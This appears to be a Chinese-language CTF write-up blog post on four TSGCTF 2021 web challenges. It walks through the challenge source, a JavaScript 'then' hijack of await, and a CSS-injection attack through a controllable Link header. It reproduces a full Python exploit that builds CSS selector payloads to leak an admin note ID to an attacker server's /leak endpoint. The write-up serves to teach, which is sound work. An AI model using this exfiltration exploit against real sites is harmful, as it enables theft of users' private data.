date: 2021-10-04
categories:
- web
- 比赛
tags:
- web
- ctf
- wp
title: TSGCTF 2021
---
# TSGCTF 2021

这个比赛感觉挺好的

## Welcome to TSG CTF!

代码很简单：

```javascript
const {promises: fs} = require('fs');
const fastify = require('fastify');

const flag = process.env.FLAG || 'DUMMY{DUMMY}';

const app = fastify();
app.get('/', async (_, res) => {
	res.type('text/html').send(await fs.readFile('index.html'));
});
app.post('/', (req, res) => {
	if (typeof req.body === 'object' && req.body[flag] === true) {
		return res.send(`Nice! flag is ${flag}`);
	}
	return res.send(`You failed...`);
});

app.listen(34705, '0.0.0.0');

```

程序是要我们猜对flag然后给个flag，但是如果我们知道flag，为啥不直接提交嘞

题目开启着报错

测试一波JSON中的类型那些是object后，得到：null,[],{}

然后req.body==null的话报错下就知道flag了，2333



## Beginner’s Web 2021

出题人说这是刚学习ctf的人3小时就能做出来的题目，2333，直到比赛结束我也没做出来

代码也很简单

```javascript
const {promises: fs} = require('fs');
const crypto = require('crypto');
const fastify = require('fastify');

const app = fastify();
app.register(require('fastify-cookie'));
app.register(require('fastify-session'), {
	secret: Math.random().toString(2),
	cookie: {secure: false},
});

const sessions = new Map();

const setRoutes = async (session, salt) => {
	const index = await fs.readFile('index.html');

	session.routes = {
		flag: () => '*** CENSORED ***',
		index: () => index.toString(),
		scrypt: (input) => crypto.scryptSync(input, salt, 64).toString('hex'),
		base64: (input) => Buffer.from(input).toString('base64'),
		set_salt: async (salt) => {
			session.routes = await setRoutes(session, salt);
			session.salt = salt;
			return 'ok';
		},
		[salt]: () => salt,
	};

	return session.routes;
};

app.get('/', async (request, reply) => {
	if (!sessions.has(request.session.sessionId)) {
		sessions.set(request.session.sessionId, {});
	}

	const session = sessions.get(request.session.sessionId);

	if (!session.salt) {
		session.salt = '';
	}
	if (!session.routes) {
		await setRoutes(session, '');
	}

	const {action, data} = request.query || {};

	let route;
	switch (action) {
		case 'Scrypt': route = 'scrypt'; break;
		case 'Base64': route = 'base64'; break;
		case 'SetSalt': route = 'set_salt'; break;
		case 'GetSalt': route = session.salt; break;
		default: route = 'index'; break;
	}

	reply.type('text/html')
	return session.routes[route](data);
});

app.listen(59101, '0.0.0.0');

```



阅读一遍代码发现一处很明显的漏洞点：`case 'GetSalt': route = session.salt; break;`

接着会直接调用`session.routes[route](data);`

但是因为

```javascript
session.routes = {
		flag: () => '*** CENSORED ***',
		index: () => index.toString(),
		scrypt: (input) => crypto.scryptSync(input, salt, 64).toString('hex'),
		base64: (input) => Buffer.from(input).toString('base64'),
		set_salt: async (salt) => {
			session.routes = await setRoutes(session, salt);
			session.salt = salt;
			return 'ok';
		},
		[salt]: () => salt,
	};
```



所以如果salt是存在的键的话，就会覆盖原来的值

继续阅读代码：

session.salt和`session.routes.[salt]`不是同时赋值的，如果能让`session.salt = salt;`赋值失败的话，就可以利用上次的salt来访问flag路由了

如果`session.routes = await setRoutes(session, salt);`是个耗时操作的话可以试试条件竞争，但是很明显不可能的

或者如果能让`session.routes = await setRoutes(session, salt);`执行之后就退出呢？

到这里我们也只能去了解await的实现

我也不怎么了解await的原理，看了wp之后惊为天人

await的实现可以参考这篇文章

https://segmentfault.com/a/1190000022638499

快一点的话就直接看官方wp的说明



>The key is `set_salt` function. Normally, it updates routes and salt together.
>
>```
>set_salt: async (salt) => {
>    session.routes = await setRoutes(session, salt);
>    session.salt = salt;
>    return 'ok';
>},
>```
>
>What if line 2 is executed but line 3 is NEVER executed? It is possible.
>
>In line 2, we are `await`-ing the execution of `setRoutes` function. Do you know `async`/`await` in ECMAScript is just a syncax sugar of `Promise`? So, we can transform this function to the following equivalent code.
>
>```
>set_salt: (salt) => {
>    return setRoutes(session, salt).then((result) => {
>        session.routes = result;
>        session.salt = salt;
>        return 'ok';
>    });
>},
>```
>
>The key is that the code is calling the chained method `then()` from the returned value of `setRoutes` function. What is the return value of this function?
>
>```
>const setRoutes = async (session, salt) => {
>    const index = await fs.readFile('index.html');
>
>    session.routes = {
>        // redacted
>        [salt]: () => salt,
>    };
>
>    return session.routes;
>};
>```
>
>It is returning the result of `session.routes`. This is unnecessary since the assignment to `session.route` is already done.
>
>Okay, we can control this value by `salt` parameter. What if we set `salt = 'then'`? It will return the following object.
>
>```
>{
>    // redacted
>    then: () => salt,
>}
>```
>
>As you can infer from the above code, this `then` method will be called with callback function as an argument. If the function is called, the returned value is considered to be `resolve`-ed and the process continues. But, this `then()` method is just ignoring the argument and the function is never called.
>
>So, by setting `salt = 'then'`, the assignment to `session.routes` happens inside `setRoutes` function, but `setRoute` function is not resolved and the assignment to `session.salt` never happens.
>
>So, send `GET /?action=SetSalt&data=then` to server and this will result in the following session state.
>
>```
>session = {
>    routes: {
>        flag: ...,
>        index: ...,
>        ...
>        then: ...,
>    },
>    salt: 'flag',
>}
>```
>
>This is what we want to achieve!

简而言之await是个语法糖，会去调用返回值的then方法，如果返回值没有then方法的话就会调用原型的then方法，

于是我们只要添加then方法就可以代替Promise.then方法了

于是乎：

```
/?action=SetSalt&data=flag
/?action=SetSalt&data=then
/?action=GetSalt
```

这样就拿到flag拉



## Udon

审一审代码，代码还是很简单

```go
package main

import (
	"context"
	"crypto/rand"
	"log"
	"math/big"
	"net/http"
	"os"
	"regexp"
	"time"

	"github.com/gin-gonic/gin"
	"gorm.io/driver/sqlite"
	"gorm.io/gorm"

	"github.com/go-redis/redis/v8"
)

type Post struct {
	ID          string    `gorm:"primaryKey"`
	UID         string    `gorm:"column:uid"`
	Title       string    `gorm:"column:title"`
	Description string    `gorm:"column:description"`
	CreatedAt   time.Time `gorm:"column:created_at"`
}

const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

func randomString(n int) (string, error) {
	b := make([]byte, n)
	for i := range b {
		idx, err := rand.Int(rand.Reader, big.NewInt(int64(len(letters))))
		if err != nil {
			return "", err
		}
		b[i] = letters[idx.Int64()]
	}
	return string(b), nil
}

func (p *Post) BeforeCreate(tx *gorm.DB) (err error) {
	p.ID, err = randomString(10)
	return err
}

func main() {
	// datastores
	/////

	db, err := gorm.Open(sqlite.Open("database.db"), &gorm.Config{})
	if err != nil {
		log.Fatalf("failed to open a database: %s", err.Error())
	}
	db.AutoMigrate(&Post{})

	posts := []Post{}
	db.Where("uid = ?", os.Getenv("ADMIN_UID")).Find(&posts)
	if len(posts) == 0 {
		db.Create(&Post{
			UID:         os.Getenv("ADMIN_UID"),
			Title:       "flag",
			Description: os.Getenv("FLAG"),
		})
	}

	rdb := redis.NewClient(&redis.Options{
		Addr:     "redis:6379",
		Password: "",
		DB:       0,
	})

	// misc configurations
	/////

	r := gin.Default()
	r.LoadHTMLGlob("./templates/*.html")
	r.Static("/assets", "./assets")

	r.Use(func(c *gin.Context) {
		c.Header("Content-Security-Policy", "script-src 'self'; style-src 'self'; base-uri 'none'")
		c.Next()
	})

	r.Use(func(c *gin.Context) {
		k := c.Query("k")
		v := c.Query("v")
		if matched, err := regexp.MatchString("^[a-zA-Z-]+$", k); matched && err == nil && v != "" {
			c.Header(k, v)
		}
		c.Next()
	})

	r.Use(func(c *gin.Context) {
		uid, err := c.Cookie("uid")
		if err != nil || uid == "" {
			uid, err = randomString(32)
			if err != nil {
				panic(err.Error())
			}
			c.SetCookie("uid", uid, 3600, "/", "", false, true)
		}
		c.Set("uid", uid)
		c.Next()
	})

	// routes
	/////

	r.GET("/", func(c *gin.Context) {
		uid, _ := c.Get("uid")

		posts := []Post{}
		db.Where("uid = ?", uid.(string)).Find(&posts)

		c.HTML(http.StatusOK, "index.html", gin.H{
			"posts": posts,
		})
	})

	r.GET("/reset", func(c *gin.Context) {
		c.Redirect(http.StatusFound, "/")
	})

	r.POST("/notes", func(c *gin.Context) {
		uid, _ := c.Get("uid")
		title := c.PostForm("title")
		description := c.PostForm("description")
		if title == "" || description == "" {
			c.AbortWithStatus(400)
			return
		}

		p := Post{
			UID:         uid.(string),
			Title:       title,
			Description: description,
		}
		db.Create(&p)
		c.Redirect(http.StatusFound, "/notes/"+p.ID)
	})

	r.GET("/notes/:id", func(c *gin.Context) {
		var post Post
		if db.First(&post, "id = ?", c.Param("id")).Error != nil {
			c.AbortWithStatus(404)
			return
		}

		c.HTML(http.StatusOK, "detail.html", gin.H{
			"post": post,
		})
	})

	r.POST("/tell", func(c *gin.Context) {
		if err := rdb.RPush(context.Background(), "query", c.PostForm("path")).Err(); err != nil {
			c.AbortWithStatus(500)
			return
		}
		c.Redirect(http.StatusFound, "/")
	})

	r.Run(":8080")
}

```

实现了以下功能：

1. 添加中间件，无cookie会自动生成
2. 会根据k,v来设置http头
3. 运行代码的时候会初始化flag到某一篇文章
4. 写日记，查看日记（只要有日记id就行），自己的日记列表，让管理员访问该网站下的某个网页



漏洞点很简单：

```go
		k := c.Query("k")
		v := c.Query("v")
		if matched, err := regexp.MatchString("^[a-zA-Z-]+$", k); matched && err == nil && v != "" {
			c.Header(k, v)
		}
```

刚好之前看到过一篇有意思的文章，了解到了通过http头(link)来设置css脚本，原本也想拿去出一题css-leak的但是直接出的话太简单了

这个题就比较有意思了

https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Link

通过设置Link头来插入css脚本

`Link: <url here>; rel="stylesheet"; type="text/css" `

但是有个问题题目有csp

`script-src 'self'; style-src 'self'; base-uri 'none'`

在旧版的ff中这个csp对link头并没有生效

但是题目用的是最新版的ff

于是需要用报错或者note来作为payload的负载

找报错找了半天没找到

比赛的时候note我只是简单试了以下（连note里双引号会被转义都没发现，错过了一个flag

但是就算note部分可控，好像在解析到我们的payload之前可能就会被浏览器因为语法错误而停止解析，

赛后了解到，通过这样的payload让note能够正常解析

```css
RANDOM CONTENT
{} * {color:red;}
RANDOM CONTENT
```

个人觉得这是因为加上了{}让浏览器以为是selector从而继续解析？

在chrome上也是可以这样的，如果有人知道原因恳请告诉我呜呜呜

直接贴上wp的exp

```python
from flask import Flask, request
import requests
import urllib.parse
import string

TARGET_BASE = "http://localhost:8888"

LEAK_LENGTH = 10
CHAR_CANDIDATES = string.ascii_letters + string.digits

EXPLOIT_BASE_ADDR = "http://host.docker.internal:1337"
app = Flask(__name__)
s = requests.Session()
s.proxies = {
    "http":"http://127.0.0.1:8080"
}

def build_payload(prefix: str, candidates: "List[str]"):
    global EXPLOIT_BASE_ADDR
    assert EXPLOIT_BASE_ADDR != "", "EXPLOIT_BASE_ADDR is not set"

    payload = "{}"
    for candidate in candidates:
        id_prefix_to_try = prefix + candidate
        matcher = ''.join(map(lambda x: '\\' + hex(ord(x))
                              [2:], '/notes/' + id_prefix_to_try))
        payload += "a[href^=" + matcher + "] { background-image: url(" + EXPLOIT_BASE_ADDR + "/leak?q=" + urllib.parse.quote(id_prefix_to_try) + "); }"
    return payload


def post_note(title: str, description: str) -> str:
    r = s.post(TARGET_BASE + "/notes", data={
        "title": title,
        "description": description,
    }, headers={
        "content-type": "application/x-www-form-urlencoded"
    }, allow_redirects=False)
    assert r.status_code == 302, "invalid status code: {}".format(
        r.status_code)
    return r.headers['Location'].split('/notes/')[-1]


def report_note_as_stylesheet(id: str) -> None:
    header_value = '</notes/{}>; rel="stylesheet"; type="text/css"'.format(id)
    r = s.post(TARGET_BASE + "/tell", data={
        "path": "/?k=Link&v={}".format(urllib.parse.quote(header_value)),
    }, allow_redirects=False)
    assert r.status_code == 302, "invalid status code: {}".format(
        r.status_code)
    return None


@app.route("/start")
def start():
    p = build_payload("", CHAR_CANDIDATES)
    exploit_id = post_note("exploit", p)
    report_note_as_stylesheet(exploit_id)
    print("[info]: started exploit with a new note: {}/notes/{}".format(TARGET_BASE, exploit_id))
    return ""


@app.route("/leak")
def leak():
    leaked_id = request.args.get('q')
    if len(leaked_id) == LEAK_LENGTH:
        print("[+] leaked (full ID): {}".format(leaked_id))
        r = s.get(TARGET_BASE + "/notes/" + leaked_id)
        print(r.text)
    else:
        print("[info] leaked: {}{}".format(
            leaked_id, "*" * (LEAK_LENGTH - len(leaked_id))))

        p = build_payload(leaked_id, CHAR_CANDIDATES)
        exploit_id = post_note("exploit", p)
        report_note_as_stylesheet(exploit_id)
        print("[info]: invoked crawler with a new note: " + exploit_id)
    return ""


if __name__ == "__main__":
    print("[info] running app ...")
    app.run(host="0.0.0.0", port=1337)
```



## Giita

没怎么看

贴上官方wp

https://hackmd.io/@hakatashi/HkgG02U4t